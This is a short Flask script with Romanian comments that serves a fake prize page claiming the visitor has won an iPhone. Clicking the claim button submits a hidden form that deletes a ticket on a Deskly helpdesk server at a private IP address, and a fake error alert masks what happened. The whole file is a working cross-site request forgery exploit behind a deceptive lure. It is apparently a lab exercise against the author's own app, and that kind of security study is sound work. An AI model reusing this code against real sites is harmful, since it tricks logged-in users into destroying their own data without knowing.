from flask import Flask, render_template_string

app = Flask(__name__)
# sa  schumb ip ul , sa nu mai fie pe localhost   
@app.route('/')
def index():
    # ID-ul tichetului pe care vrei să-l ștergi (ia-l din DB-ul tău Deskly)
    target_id = "6cb50e41001741f9a56a02c8531166dc"
    
    return render_template_string('''
<html>
<head>
    <title>CASTIGATOR!</title>
</head>
<body style="background-color: black; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 100px;">
    <h1>🎉 Felicitari! 🎉</h1>
    <p>Ai castigat noul iPhone 17 Pro Max Ultra Edition!</p>
    <p>Apasa butonul de mai jos pentru a revendica premiul:</p>
    
    <button id="btn-claim" style="padding: 15px 30px; font-size: 20px; cursor: pointer; background: gold; border-radius: 10px;">
        Revendica premiul
    </button>

    <form id="attack-form" action="http://100.77.253.68:5000/tickets/delete/''' + target_id + '''" method="POST" style="display:none;">
        <input type="hidden" name="confirm" value="true">
    </form>

    <script>
        document.getElementById('btn-claim').onclick = function() {
            alert('Eroare sistem: Se proceseaza cererea...');
            // Trimitem formularul de stergere fara ca userul sa stie ce trimite de fapt
            document.getElementById('attack-form').submit();
        };
    </script>
</body>
</html>
''')

if __name__ == "__main__":
    app.run(port=5001,host='0.0.0.0')